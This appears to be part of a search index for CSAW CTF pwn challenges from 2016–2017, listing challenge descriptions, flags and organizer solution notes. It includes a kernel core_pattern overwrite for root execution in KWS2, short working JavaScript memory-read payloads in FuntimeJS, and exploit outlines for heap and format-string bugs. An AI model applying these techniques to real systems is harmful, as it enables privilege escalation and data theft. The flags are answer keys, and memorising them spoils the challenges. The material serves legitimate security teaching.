            "text": "KWS2 (Same as /web/csaw-kernel-challenge)\n\n\nAuthor\n\n\nitszn, Ret2 Systems\n\n\nPoints\n\n\n500\n\n\nCategory\n\n\nPwn\n\n\nDescription\n\n\nWe developed a much better alternative to AWS. Our high-performance kernel driver gives us unparalleled speed of execution. And we're super-secure!\nNOTE: Login with your CTFd credentials.\nNOTE: This might take a minute to start up the first time you login. Please be patient!\nNOTE: There may be ways to poke at other teams' boxes. Don't do that, it is not part of the challenge.\nNOTE: If you have issues with your instance, try logging out of the KWS interface, and logging back in.\n\n\nFlag\n\n\nflag{7h1s_1s_pr0b4ably_sl0w3r_th4n_4_n0rmal_d1ct}\n\n\nSolution\n\n\nThe kernel module on the KWS instance implments a hashmap, with the ability to parse\npython objects out of userspace.\n\n\nThe supported objects are dict, string, and number.\n\n\nWhen a dict is parsed from userspace, it assumes it is a json based dict and has a special case\nfor the keys of the dict. Keys are assumed to be strings or numbers, not other dicts, so\n\ndeserializePrimative\n is used instead of \ndeserialize\n.\n\n\nThe problem is the if else on line 307. If it is not a number type, it assumes it is a string.\nIf we create a python object with a dict as a key, it will build it as a string.\n\n\nThis in itself isn't too useful, because we could create a malformed string normally,\nand have the same results. However, if we give it a real string, but set the type string to \"dict\",\nit will later on try to access the string as a hashtable.\n\n\nThis allows us to control pointers that the kernel module will follow. The place this is useful is\nin the makeCircular code (line 96).\n\n\nIf we create a fake bucket in userspace, which points to some kernelspace memory address,\nthis will write the address of the fake bucket to that kernelspace address. This gives us an\narbitrary write.\n\n\nWith SMEP on, we can attack \ncore_pattern\n. First we find the address of \ncore_pattern\n in \n/proc/kallsyms\n.\nThen we write \n|/tmp/a\n to that kernel address. This will cause the kernel to execute \n/tmp/a\n as root whenever a\nprogram dumps core.\n\n\nAll we need to do is write a shell script to get the flag in \n/tmp/a\n and cause a segfault.\n\n\nsol.c\n\n\nSetup\n\n\nEach team should get their own instance running the KWS back end. There is a main server that acts as the\nface of the web challenge, and will allow players to reboot/reset their instance (if they fuck up the kernel part)", 
            "title": "KWS 2"
        }, 
        {
            "location": "/challenges/2017/pwn/KWS2/#kws2-same-as-webcsaw-kernel-challenge", 
            "text": "", 
            "title": "KWS2 (Same as /web/csaw-kernel-challenge)"
        }, 
        {
            "location": "/challenges/2017/pwn/KWS2/#author", 
            "text": "itszn, Ret2 Systems", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2017/pwn/KWS2/#points", 
            "text": "500", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2017/pwn/KWS2/#category", 
            "text": "Pwn", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2017/pwn/KWS2/#description", 
            "text": "We developed a much better alternative to AWS. Our high-performance kernel driver gives us unparalleled speed of execution. And we're super-secure!\nNOTE: Login with your CTFd credentials.\nNOTE: This might take a minute to start up the first time you login. Please be patient!\nNOTE: There may be ways to poke at other teams' boxes. Don't do that, it is not part of the challenge.\nNOTE: If you have issues with your instance, try logging out of the KWS interface, and logging back in.", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2017/pwn/KWS2/#flag", 
            "text": "flag{7h1s_1s_pr0b4ably_sl0w3r_th4n_4_n0rmal_d1ct}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2017/pwn/KWS2/#solution", 
            "text": "The kernel module on the KWS instance implments a hashmap, with the ability to parse\npython objects out of userspace.  The supported objects are dict, string, and number.  When a dict is parsed from userspace, it assumes it is a json based dict and has a special case\nfor the keys of the dict. Keys are assumed to be strings or numbers, not other dicts, so deserializePrimative  is used instead of  deserialize .  The problem is the if else on line 307. If it is not a number type, it assumes it is a string.\nIf we create a python object with a dict as a key, it will build it as a string.  This in itself isn't too useful, because we could create a malformed string normally,\nand have the same results. However, if we give it a real string, but set the type string to \"dict\",\nit will later on try to access the string as a hashtable.  This allows us to control pointers that the kernel module will follow. The place this is useful is\nin the makeCircular code (line 96).  If we create a fake bucket in userspace, which points to some kernelspace memory address,\nthis will write the address of the fake bucket to that kernelspace address. This gives us an\narbitrary write.  With SMEP on, we can attack  core_pattern . First we find the address of  core_pattern  in  /proc/kallsyms .\nThen we write  |/tmp/a  to that kernel address. This will cause the kernel to execute  /tmp/a  as root whenever a\nprogram dumps core.  All we need to do is write a shell script to get the flag in  /tmp/a  and cause a segfault.  sol.c", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2017/pwn/KWS2/#setup", 
            "text": "Each team should get their own instance running the KWS back end. There is a main server that acts as the\nface of the web challenge, and will allow players to reboot/reset their instance (if they fuck up the kernel part)", 
            "title": "Setup"
        }, 
        {
            "location": "/challenges/2017/pwn/minesweeper/", 
            "text": "Pwn Minesweeper\n\n\nAuthor\n\n\nPoints\n\n\n500\n\n\nCategory\n\n\nPwn\n\n\nDescription\n\n\nConnect to the binary. ASLR is on. Binary is attached. Spawn a shell\n\n\nFlag\n\n\nflag-{TEH_FLAG}\n\n\nSolution\n\n\nsolution.pdf\n\n\nsol.py", 
            "title": "Minesweeper"
        }, 
        {
            "location": "/challenges/2017/pwn/minesweeper/#pwn-minesweeper", 
            "text": "", 
            "title": "Pwn Minesweeper"
        }, 
        {
            "location": "/challenges/2017/pwn/minesweeper/#author", 
            "text": "", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2017/pwn/minesweeper/#points", 
            "text": "500", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2017/pwn/minesweeper/#category", 
            "text": "Pwn", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2017/pwn/minesweeper/#description", 
            "text": "Connect to the binary. ASLR is on. Binary is attached. Spawn a shell", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2017/pwn/minesweeper/#flag", 
            "text": "flag-{TEH_FLAG}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2017/pwn/minesweeper/#solution", 
            "text": "solution.pdf  sol.py", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2017/pwn/funtimejs/", 
            "text": "FuntimeJS (2 Parts)\n\n\nAuthor\n\n\nPoints\n\n\n400\n\n\nCategory\n\n\nPwn\n\n\nDescription\n\n\nPart 2 of LittleQuery (Web)\nJavaScript is memory safe, right? So you can't read the flag at physical address 0xdeadbeeeef, right?\nRight?\n\nhttp://littlequery.chal.csaw.io\n\nUPDATE 14:10 Eastern: I'm dumb. The unintentional solution is now in a separate challenge (FuntimeJS 2).\n\n\nFlag\n\n\nflag{1_th0t_j@vascript_w@s_mem0ry_s@f3!}\n\n\nflag{I_f0rg0t_1n1trd_1nclud3d_a11_files}\n\n\nSolution\n\n\nPart 1:\n\nconsole.log(__SYSCALL.initrdReadFile(\n/flag.txt\n))\n\nPart 2:\n\n\nlet mem = __SYSCALL.getSystemResources().memoryRange\nlet view = (where) =\n new Uint8Array(mem.block(where, 0x100).buffer())\nview(0x1a01000+0x41*8).set([0xeb,0x00,0xa0,0xad,0xde])\nconsole.log(String.fromCharCode.apply(null, view((0x41\n21) + 0x1eeeef)))", 
            "title": "FuntimeJS"
        }, 
        {
            "location": "/challenges/2017/pwn/funtimejs/#funtimejs-2-parts", 
            "text": "", 
            "title": "FuntimeJS (2 Parts)"
        }, 
        {
            "location": "/challenges/2017/pwn/funtimejs/#author", 
            "text": "", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2017/pwn/funtimejs/#points", 
            "text": "400", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2017/pwn/funtimejs/#category", 
            "text": "Pwn", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2017/pwn/funtimejs/#description", 
            "text": "Part 2 of LittleQuery (Web)\nJavaScript is memory safe, right? So you can't read the flag at physical address 0xdeadbeeeef, right?\nRight? http://littlequery.chal.csaw.io \nUPDATE 14:10 Eastern: I'm dumb. The unintentional solution is now in a separate challenge (FuntimeJS 2).", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2017/pwn/funtimejs/#flag", 
            "text": "flag{1_th0t_j@vascript_w@s_mem0ry_s@f3!}  flag{I_f0rg0t_1n1trd_1nclud3d_a11_files}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2017/pwn/funtimejs/#solution", 
            "text": "Part 1: console.log(__SYSCALL.initrdReadFile( /flag.txt )) \nPart 2:  let mem = __SYSCALL.getSystemResources().memoryRange\nlet view = (where) =  new Uint8Array(mem.block(where, 0x100).buffer())\nview(0x1a01000+0x41*8).set([0xeb,0x00,0xa0,0xad,0xde])\nconsole.log(String.fromCharCode.apply(null, view((0x41 21) + 0x1eeeef)))", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2017/pwn/firewall/", 
            "text": "FIREWALL\n\n\nAuthor\n\n\nPoints\n\n\n400\n\n\nCategory\n\n\nPwn\n\n\nDescription\n\n\nAfter rummaging around the network for a few days, the IT department was able to\nfind the dust covered machine hosting the hospital's firewall. We don't have budget\nto update it... so just take a quick look and tell us it's good for another year. \n\n\nFlag\n\n\nflag{w3_f3ll_pr3tty_f4r_d0wn_th3_w1nd0ws_r4bb1t_h0le_huh}\n\n\nSolution\n\n\nexploit.py\n\n\nPremise\n\n\nThis is an exploitation challenge that is compiled for the old, Windows POSIX Subsystem.\n\n\nTo complete this challenge, it is expected that teams are going to have to have to\nactually get the executable running in the SUA 4.0 (Subsystem for Unix Applications)\nenvironment. This subsystem was shipped as a part of Windows from NT 4.0 - Windows 8.\n\n\nThe challenge uses fingerprints of the SUA environment to generate the initial 'token'\ncheck. This is an attempt to deter teams from solving it statically / bruteforcing\nagainst the server and ensure that they can debug the challenge locally.\n\n\nFirewall is modeled to be a memory corruption challenge, but does not (intentionally)\ngive the players a means to hijack control flow. There is also some light obfuscation. \n\n\nThe expected solution will leak a memory address of a static string and then\noverwrite said address (in a string table) with the address of the flag (which\nis read into memory during initialization).\n\n\nIMO as an exploitation challenge, this is not \nhard\n. But lots of tidbits / the weird\nenvironment ticks it up from a 300pt challenge, to 400pt.\n\n\nOther tidbits:\n- I developed the challenge on an x86 Windows 7 Enterprise VM\n- The expected solution (an exploit) may fail 50/50 due to the leak failing (ASLR dependent)\n- There is a red herring / buffer overflow that is not intended to be exploitable :')", 
            "title": "Firewall"
        }, 
        {
            "location": "/challenges/2017/pwn/firewall/#firewall", 
            "text": "", 
            "title": "FIREWALL"
        }, 
        {
            "location": "/challenges/2017/pwn/firewall/#author", 
            "text": "", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2017/pwn/firewall/#points", 
            "text": "400", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2017/pwn/firewall/#category", 
            "text": "Pwn", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2017/pwn/firewall/#description", 
            "text": "After rummaging around the network for a few days, the IT department was able to\nfind the dust covered machine hosting the hospital's firewall. We don't have budget\nto update it... so just take a quick look and tell us it's good for another year.", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2017/pwn/firewall/#flag", 
            "text": "flag{w3_f3ll_pr3tty_f4r_d0wn_th3_w1nd0ws_r4bb1t_h0le_huh}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2017/pwn/firewall/#solution", 
            "text": "exploit.py", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2017/pwn/firewall/#premise", 
            "text": "This is an exploitation challenge that is compiled for the old, Windows POSIX Subsystem.  To complete this challenge, it is expected that teams are going to have to have to\nactually get the executable running in the SUA 4.0 (Subsystem for Unix Applications)\nenvironment. This subsystem was shipped as a part of Windows from NT 4.0 - Windows 8.  The challenge uses fingerprints of the SUA environment to generate the initial 'token'\ncheck. This is an attempt to deter teams from solving it statically / bruteforcing\nagainst the server and ensure that they can debug the challenge locally.  Firewall is modeled to be a memory corruption challenge, but does not (intentionally)\ngive the players a means to hijack control flow. There is also some light obfuscation.   The expected solution will leak a memory address of a static string and then\noverwrite said address (in a string table) with the address of the flag (which\nis read into memory during initialization).  IMO as an exploitation challenge, this is not  hard . But lots of tidbits / the weird\nenvironment ticks it up from a 300pt challenge, to 400pt.  Other tidbits:\n- I developed the challenge on an x86 Windows 7 Enterprise VM\n- The expected solution (an exploit) may fail 50/50 due to the leak failing (ASLR dependent)\n- There is a red herring / buffer overflow that is not intended to be exploitable :')", 
            "title": "Premise"
        }, 
        {
            "location": "/challenges/2017/pwn/connectXor/", 
            "text": "ConnectXor\n\n\nAuthor\n\n\nPoints\n\n\n350\n\n\nCategory\n\n\nPwn\n\n\nDescription\n\n\nThis challenge is a simple connect 4 game.  It has the ability to support a few\nplayers and one observer per player.  The goal of the challenge is to force\nteams to explore the state-space of the program.\n\n\nTeams must discern that after a observing a tie game, an observer can replay\nthe game in its entirety.  Theobserver can choose to go back any number of\nmoves, or to any CPU timer state in the game.  This timer value can overflow if\nthe observer stays on the prompt asking for a replay for too long.\n\n\nOnce that timer value overflows, this causes a condition where a loop variable\nis never properly set, and remains as -1.  This variable is then used as an\nindex to access previous moves.  Given the arrangement of the game_t type, the\nprevious moves are stored directly adjacent to the player's name, which the\nplayer can directly control.\n\n\nFinally, when the game is being replayed, the board is printed for each move\nmade.  If a board state is determined to be invalid, the board is simply\n\"printed\" to the screen.  This is done incorrectly, by passing the board as a\nchar * directly to an fprintf function call.\n\n\nTeams can then use the shellcode they placed in the name field to overwrite the\nstack and get code execution.  They can use this codex to find the flag which\nis stored at /flag.\n\n\nFlag\n\n\nflag{st@t3ful_und3rfl0w}\n\n\nSolution\n\n\nsolver.py\n\n\nSetup\n\n\nGiven you have a basic linux system with Docker, you should be able to build an\nimage simply by running build.sh.\nSimilarly, run.sh with run the docker image with a restart mechanism.\nThis challenge should be run with auto-restart (as done in run.sh) as teams can\ncrash the service with certain inputs.", 
            "title": "ConnectXOR"
        }, 
        {
            "location": "/challenges/2017/pwn/connectXor/#connectxor", 
            "text": "", 
            "title": "ConnectXor"
        }, 
        {
            "location": "/challenges/2017/pwn/connectXor/#author", 
            "text": "", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2017/pwn/connectXor/#points", 
            "text": "350", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2017/pwn/connectXor/#category", 
            "text": "Pwn", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2017/pwn/connectXor/#description", 
            "text": "This challenge is a simple connect 4 game.  It has the ability to support a few\nplayers and one observer per player.  The goal of the challenge is to force\nteams to explore the state-space of the program.  Teams must discern that after a observing a tie game, an observer can replay\nthe game in its entirety.  Theobserver can choose to go back any number of\nmoves, or to any CPU timer state in the game.  This timer value can overflow if\nthe observer stays on the prompt asking for a replay for too long.  Once that timer value overflows, this causes a condition where a loop variable\nis never properly set, and remains as -1.  This variable is then used as an\nindex to access previous moves.  Given the arrangement of the game_t type, the\nprevious moves are stored directly adjacent to the player's name, which the\nplayer can directly control.  Finally, when the game is being replayed, the board is printed for each move\nmade.  If a board state is determined to be invalid, the board is simply\n\"printed\" to the screen.  This is done incorrectly, by passing the board as a\nchar * directly to an fprintf function call.  Teams can then use the shellcode they placed in the name field to overwrite the\nstack and get code execution.  They can use this codex to find the flag which\nis stored at /flag.", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2017/pwn/connectXor/#flag", 
            "text": "flag{st@t3ful_und3rfl0w}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2017/pwn/connectXor/#solution", 
            "text": "solver.py", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2017/pwn/connectXor/#setup", 
            "text": "Given you have a basic linux system with Docker, you should be able to build an\nimage simply by running build.sh.\nSimilarly, run.sh with run the docker image with a restart mechanism.\nThis challenge should be run with auto-restart (as done in run.sh) as teams can\ncrash the service with certain inputs.", 
            "title": "Setup"
        }, 
        {
            "location": "/challenges/2017/pwn/GlobalThermonuclearCyberwar/", 
            "text": "Global Thermonuclar Cyberwar\n\n\nAuthor\n\n\nPremise\n\n\nIt's a Wargames-themed challenge, in 8086 real-mode assembly!\nLaunch CyberNukes to win... kinda\n\n\nPart 1:\n\n\nDEFCON 1\n\n\nPoints\n\n\n50\n\n\nDescription\n\n\nThe year is 1981. Matthew Cyber-Broderick (You) finds a bizzare system. Understand it, and decrypt the secret ROM within.\n\n\nCategory\n\n\nReverseing\n\n\nFlag\n\n\nflag{ok_you_decrypted_it_now_plz_pwn_it!}\n\n\nSolution\n\n\nDecrypt the payload, the flag is in the ROM\n\n\nPart 2:\n\n\nGlobal Thermonuclear Cyberwar\n\n\nPoints\n\n\n350\n\n\nDescription\n\n\nIn this strange game, the only winning move is pwn.\n\n\nCategory\n\n\nPwn\n\n\nFlag\n\n\nflag{c4n_4ny0n3_really_w1n_1n_cyb3rw4r?}\n\n\nSolution\n\n\nSee \nsolve.py\n for exploit\n\n\nSetup\n\n\nFor both parts, please distribute \ncyberwar.rom\n, which has the second flag scrubbed.\nRun \nserver.rom\n on QEMU with the VNC server exposed to the competitors.\n\n\nThe competitors should be told they can run the binary with:\n    \nqemu-system-i386 -drive format=raw,file=cyberwar.rom\n\nAnd a vnc server locally with:\n    \nqemu-system-i386 -vnc :0 -drive format=raw,file=cyberwar.rom\n\n\nTo be nice to the competitors, note that the gdbstub in the latest QEMU on ubuntu has had issues for us. A known-good version of QEMU is:\n    \n2.10.1", 
            "title": "GlobalThermonuclearCyberwar"
        }, 
        {
            "location": "/challenges/2017/pwn/GlobalThermonuclearCyberwar/#global-thermonuclar-cyberwar", 
            "text": "", 
            "title": "Global Thermonuclar Cyberwar"
        }, 
        {
            "location": "/challenges/2017/pwn/GlobalThermonuclearCyberwar/#author", 
            "text": "", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2017/pwn/GlobalThermonuclearCyberwar/#premise", 
            "text": "It's a Wargames-themed challenge, in 8086 real-mode assembly!\nLaunch CyberNukes to win... kinda", 
            "title": "Premise"
        }, 
        {
            "location": "/challenges/2017/pwn/GlobalThermonuclearCyberwar/#part-1", 
            "text": "", 
            "title": "Part 1:"
        }, 
        {
            "location": "/challenges/2017/pwn/GlobalThermonuclearCyberwar/#defcon-1", 
            "text": "", 
            "title": "DEFCON 1"
        }, 
        {
            "location": "/challenges/2017/pwn/GlobalThermonuclearCyberwar/#points", 
            "text": "50", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2017/pwn/GlobalThermonuclearCyberwar/#description", 
            "text": "The year is 1981. Matthew Cyber-Broderick (You) finds a bizzare system. Understand it, and decrypt the secret ROM within.", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2017/pwn/GlobalThermonuclearCyberwar/#category", 
            "text": "Reverseing", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2017/pwn/GlobalThermonuclearCyberwar/#flag", 
            "text": "flag{ok_you_decrypted_it_now_plz_pwn_it!}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2017/pwn/GlobalThermonuclearCyberwar/#solution", 
            "text": "Decrypt the payload, the flag is in the ROM", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2017/pwn/GlobalThermonuclearCyberwar/#part-2", 
            "text": "", 
            "title": "Part 2:"
        }, 
        {
            "location": "/challenges/2017/pwn/GlobalThermonuclearCyberwar/#global-thermonuclear-cyberwar", 
            "text": "", 
            "title": "Global Thermonuclear Cyberwar"
        }, 
        {
            "location": "/challenges/2017/pwn/GlobalThermonuclearCyberwar/#points_1", 
            "text": "350", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2017/pwn/GlobalThermonuclearCyberwar/#description_1", 
            "text": "In this strange game, the only winning move is pwn.", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2017/pwn/GlobalThermonuclearCyberwar/#category_1", 
            "text": "Pwn", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2017/pwn/GlobalThermonuclearCyberwar/#flag_1", 
            "text": "flag{c4n_4ny0n3_really_w1n_1n_cyb3rw4r?}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2017/pwn/GlobalThermonuclearCyberwar/#solution_1", 
            "text": "See  solve.py  for exploit", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2017/pwn/GlobalThermonuclearCyberwar/#setup", 
            "text": "For both parts, please distribute  cyberwar.rom , which has the second flag scrubbed.\nRun  server.rom  on QEMU with the VNC server exposed to the competitors.  The competitors should be told they can run the binary with:\n     qemu-system-i386 -drive format=raw,file=cyberwar.rom \nAnd a vnc server locally with:\n     qemu-system-i386 -vnc :0 -drive format=raw,file=cyberwar.rom  To be nice to the competitors, note that the gdbstub in the latest QEMU on ubuntu has had issues for us. A known-good version of QEMU is:\n     2.10.1", 
            "title": "Setup"
        }, 
        {
            "location": "/challenges/2016/pwn/Moms_Spaghetti/", 
            "text": "Mom's Spaghetti\n\n\nAuthor\n\n\nDr. Raid\n\n\nPoints\n\n\nn/a\n\n\nCategory\n\n\nPwn\n\n\nDescription\n\n\nohai\n\n\nSo this challenge is based on a real bug I found in a thing one time reversing.\nThe bug is tricky. Do you see it? I can totally give a write-up / break down.\n\n\nThe environment will be important because heap mastery is required, and I have\nonly proven it against Ubuntu 16.04 (or whatever latest is) 64bit.\n\n\nThe challenge itself is intentionally 32bit because I wanted to recreate the \nexact. I have included a proof of concept exploit. It's not 100% reliable, but\nso far it hasn't crashed on failure (because of the nature of the bug), and \nhas usually only fails on the first try (if at all), probably something to do\nwith the system being cranky about issuing memory until the first round of\ngrooming. The exploit executes a command to cat flag.txt and then request its\noutput to a webserver (though the contestants can get creative).\n\n\nThe service runs on port 24242, and needs to be able to connect out to \ncontestants. This is important. The reason why: to groom the heap, I opted for\nthreads. The service accepts connections, fork()s, then the client can \nspecify a port and a count of threads to connect back to them. This way the \nclients don't interfere with each other's memory space etc.\n\n\nPlease put the attached flag.txt into running directory of the service. Also\nyou probably don't want to recompile if we want it reproducibly exploitable \n(with a poc to show the haters then they hate).\n\n\n-raid\n\n\nFlag\n\n\nflag{heap_garden_on_fleek_fam}\n\n\nSolution\n\n\nexploit_poc.py", 
            "title": "Mom's Spaghetti"
        }, 
        {
            "location": "/challenges/2016/pwn/Moms_Spaghetti/#moms-spaghetti", 
            "text": "", 
            "title": "Mom's Spaghetti"
        }, 
        {
            "location": "/challenges/2016/pwn/Moms_Spaghetti/#author", 
            "text": "Dr. Raid", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2016/pwn/Moms_Spaghetti/#points", 
            "text": "n/a", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2016/pwn/Moms_Spaghetti/#category", 
            "text": "Pwn", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2016/pwn/Moms_Spaghetti/#description", 
            "text": "ohai  So this challenge is based on a real bug I found in a thing one time reversing.\nThe bug is tricky. Do you see it? I can totally give a write-up / break down.  The environment will be important because heap mastery is required, and I have\nonly proven it against Ubuntu 16.04 (or whatever latest is) 64bit.  The challenge itself is intentionally 32bit because I wanted to recreate the \nexact. I have included a proof of concept exploit. It's not 100% reliable, but\nso far it hasn't crashed on failure (because of the nature of the bug), and \nhas usually only fails on the first try (if at all), probably something to do\nwith the system being cranky about issuing memory until the first round of\ngrooming. The exploit executes a command to cat flag.txt and then request its\noutput to a webserver (though the contestants can get creative).  The service runs on port 24242, and needs to be able to connect out to \ncontestants. This is important. The reason why: to groom the heap, I opted for\nthreads. The service accepts connections, fork()s, then the client can \nspecify a port and a count of threads to connect back to them. This way the \nclients don't interfere with each other's memory space etc.  Please put the attached flag.txt into running directory of the service. Also\nyou probably don't want to recompile if we want it reproducibly exploitable \n(with a poc to show the haters then they hate).  -raid", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2016/pwn/Moms_Spaghetti/#flag", 
            "text": "flag{heap_garden_on_fleek_fam}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2016/pwn/Moms_Spaghetti/#solution", 
            "text": "exploit_poc.py", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2016/pwn/Ed-Edd-Eddie/", 
            "text": "Ed Edd and Eddie\n\n\nAuthor\n\n\nPoints\n\n\n300\n\n\nCategory\n\n\nPwn\n\n\nDescription\n\n\nButtered Toast, Double Dee.\n\n\nFlag\n\n\nflag{ed_was_always_the_forgotten_child}\n\n\nSolution\n\n\ned.py", 
            "title": "Ed, Edd, and Eddie"
        }, 
        {
            "location": "/challenges/2016/pwn/Ed-Edd-Eddie/#ed-edd-and-eddie", 
            "text": "", 
            "title": "Ed Edd and Eddie"
        }, 
        {
            "location": "/challenges/2016/pwn/Ed-Edd-Eddie/#author", 
            "text": "", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2016/pwn/Ed-Edd-Eddie/#points", 
            "text": "300", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2016/pwn/Ed-Edd-Eddie/#category", 
            "text": "Pwn", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2016/pwn/Ed-Edd-Eddie/#description", 
            "text": "Buttered Toast, Double Dee.", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2016/pwn/Ed-Edd-Eddie/#flag", 
            "text": "flag{ed_was_always_the_forgotten_child}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2016/pwn/Ed-Edd-Eddie/#solution", 
            "text": "ed.py", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2016/pwn/ReversePolish/", 
            "text": "Reverse Polish\n\n\nAuthor\n\n\nPoints\n\n\n400\n\n\nCategory\n\n\nPwn\n\n\nDescription\n\n\n\ud83d\udc4c\ud83d\udc40\ud83d\udc4c\ud83d\udc40\ud83d\udc4c\ud83d\udc40\ud83d\udc4c\ud83d\udc40\ud83d\udc4c\ud83d\udc40 good shit go\u0c66\u0501 sHit\ud83d\udc4c thats \u2714 some good\ud83d\udc4c\ud83d\udc4cshit right\ud83d\udc4c\ud83d\udc4cthere\ud83d\udc4c\ud83d\udc4c\ud83d\udc4c right\u2714there \u2714\u2714if i do \u01bda\u04af so my self \ud83d\udcaf i say so \ud83d\udcaf thats what im talking about right there right there (chorus: \u02b3\u1da6\u1d4d\u02b0\u1d57 \u1d57\u02b0\u1d49\u02b3\u1d49) mMMMM\u13b7\u041c\ud83d\udcaf \ud83d\udc4c\ud83d\udc4c \ud83d\udc4c\u041dO0\u041e\u0b20OOOOO\u041e\u0b20\u0b20Oooo\u1d52\u1d52\u1d52\u1d52\u1d52\u1d52\u1d52\u1d52\u1d52\ud83d\udc4c \ud83d\udc4c\ud83d\udc4c \ud83d\udc4c \ud83d\udcaf \ud83d\udc4c \ud83d\udc40 \ud83d\udc40 \ud83d\udc40 \ud83d\udc4c\ud83d\udc4cGood shit\n\n\nFlag\n\n\nflag{she-will-feed-you-tomatoes-and-radio-wires-but-dont-hate-her-when-she-gets-up-to-leave}\n\n\nSolution", 
            "title": "Reverse Polish"
        }, 
        {
            "location": "/challenges/2016/pwn/ReversePolish/#reverse-polish", 
            "text": "", 
            "title": "Reverse Polish"
        }, 
        {
            "location": "/challenges/2016/pwn/ReversePolish/#author", 
            "text": "", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2016/pwn/ReversePolish/#points", 
            "text": "400", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2016/pwn/ReversePolish/#category", 
            "text": "Pwn", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2016/pwn/ReversePolish/#description", 
            "text": "\ud83d\udc4c\ud83d\udc40\ud83d\udc4c\ud83d\udc40\ud83d\udc4c\ud83d\udc40\ud83d\udc4c\ud83d\udc40\ud83d\udc4c\ud83d\udc40 good shit go\u0c66\u0501 sHit\ud83d\udc4c thats \u2714 some good\ud83d\udc4c\ud83d\udc4cshit right\ud83d\udc4c\ud83d\udc4cthere\ud83d\udc4c\ud83d\udc4c\ud83d\udc4c right\u2714there \u2714\u2714if i do \u01bda\u04af so my self \ud83d\udcaf i say so \ud83d\udcaf thats what im talking about right there right there (chorus: \u02b3\u1da6\u1d4d\u02b0\u1d57 \u1d57\u02b0\u1d49\u02b3\u1d49) mMMMM\u13b7\u041c\ud83d\udcaf \ud83d\udc4c\ud83d\udc4c \ud83d\udc4c\u041dO0\u041e\u0b20OOOOO\u041e\u0b20\u0b20Oooo\u1d52\u1d52\u1d52\u1d52\u1d52\u1d52\u1d52\u1d52\u1d52\ud83d\udc4c \ud83d\udc4c\ud83d\udc4c \ud83d\udc4c \ud83d\udcaf \ud83d\udc4c \ud83d\udc40 \ud83d\udc40 \ud83d\udc40 \ud83d\udc4c\ud83d\udc4cGood shit", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2016/pwn/ReversePolish/#flag", 
            "text": "flag{she-will-feed-you-tomatoes-and-radio-wires-but-dont-hate-her-when-she-gets-up-to-leave}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2016/pwn/ReversePolish/#solution", 
            "text": "", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2016/pwn/thimblerig/", 
            "text": "Thimblerig\n\n\nAuthor\n\n\nPoints\n\n\n300\n\n\nCategory\n\n\nPwn\n\n\nDescription\n\n\nThis guy has shells!\n\n\nFlag\n\n\nflag{GottaBeShiftyLikeTheGriftah}\n\n\nSolution\n\n\nexploit.py", 
            "title": "Thimblerig"
        }, 
        {
            "location": "/challenges/2016/pwn/thimblerig/#thimblerig", 
            "text": "", 
            "title": "Thimblerig"
        }, 
        {
            "location": "/challenges/2016/pwn/thimblerig/#author", 
            "text": "", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2016/pwn/thimblerig/#points", 
            "text": "300", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2016/pwn/thimblerig/#category", 
            "text": "Pwn", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2016/pwn/thimblerig/#description", 
            "text": "This guy has shells!", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2016/pwn/thimblerig/#flag", 
            "text": "flag{GottaBeShiftyLikeTheGriftah}", 
            "title": "Flag"
